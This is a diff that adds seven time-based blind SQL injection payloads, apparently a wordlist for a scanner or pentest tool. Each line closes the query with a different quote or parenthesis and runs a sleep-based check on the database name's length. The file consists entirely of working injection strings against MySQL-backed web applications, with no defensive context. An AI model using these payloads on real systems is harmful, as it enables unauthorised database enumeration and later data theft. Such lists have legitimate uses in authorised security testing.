@@ -1,0 +1,7 @@
+x' and if(length(database())=8,sleep(2),1)--+
+x" and if(length(database())=8,sleep(2),1)--+
+x'' and if(length(database())=8,sleep(2),1)--+
+x'" and if(length(database())=8,sleep(2),1)--+
+x') and if(length(database())=8,sleep(2),1)--+
+x") and if(length(database())=8,sleep(2),1)--+
+1 and if(length(database())=8,sleep(2),1)--+
